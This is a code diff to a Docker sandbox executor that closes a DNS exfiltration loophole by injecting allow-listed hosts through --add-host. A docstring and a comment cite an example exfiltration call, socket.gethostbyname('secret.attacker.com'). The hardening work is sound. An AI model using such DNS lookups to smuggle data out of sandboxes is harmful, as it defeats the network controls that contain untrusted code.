@@ -17,13 +17,23 @@ pointing at an SNI-aware proxy (default 127.0.0.1:8888). The proxy
 inspects the TLS SNI / HTTP Host header and allows/denies based on the
 domain — solving CDN IP rotation. No NET_ADMIN cap needed.
 
-## Security architecture (v2.0)
+## Security architecture (v3.1)
 
 The container runs with --cap-drop ALL and --security-opt
 no-new-privileges. The --entrypoint python3 flag bypasses the sandbox
 image's legacy iptables entrypoint (which required SETGID/SETUID caps
 for runuser). In proxy mode, the container has no special capabilities
 at all — the proxy handles all filtering externally.
+
+v3.1 DNS exfiltration fix: When an allow-list is present, the executor
+resolves allow-listed domains on the HOST at startup and injects them
+into the container via Docker's ``--add-host`` flag (e.g.,
+``--add-host pypi.org:151.101.0.223``). This eliminates the need for
+DNS (port 53) access inside the container, closing the loophole where
+malicious code could exfiltrate data via
+``socket.gethostbyname("secret.attacker.com")``. The container's
+``/etc/hosts`` contains only the injected entries — no DNS resolver is
+available.
 
 DNS can be restricted to a specific resolver via the `dns_resolver`
 parameter, which is passed to the SNI proxy for DNS resolution pinning
@@ -165,6 +175,13 @@ class DockerSandboxExecutor:
                 "--workdir", "/tmp",
                 "--entrypoint", "python3",
             ]
+            # v3.1: DNS exfiltration fix — inject allow-listed domains
+            # via --add-host so the container can route to them without
+            # DNS access. This closes the loophole where malicious code
+            # could exfiltrate data via socket.gethostbyname() to an
+            # attacker-controlled DNS server.
+            if self._allowlist is not None:
+                cmd.extend(self._allowlist.generate_add_host_args())
             # Set proxy env vars so HTTP clients in the container use the proxy.
             proxy_url = f"http://{proxy_addr}"
             proxy_env = {
@@ -247,6 +264,10 @@ class DockerSandboxExecutor:
                 result.evidence["network_mode"] = "proxy"
                 result.evidence["proxy_egress"] = proxy_addr
                 result.evidence["dns_restricted"] = bool(self._dns_resolver)
+                result.evidence["dns_injection"] = (
+                    self._allowlist is not None
+                    and not self._allowlist.is_empty
+                )
             else:
                 result.evidence["network_mode"] = "none" if not network else "default"
 
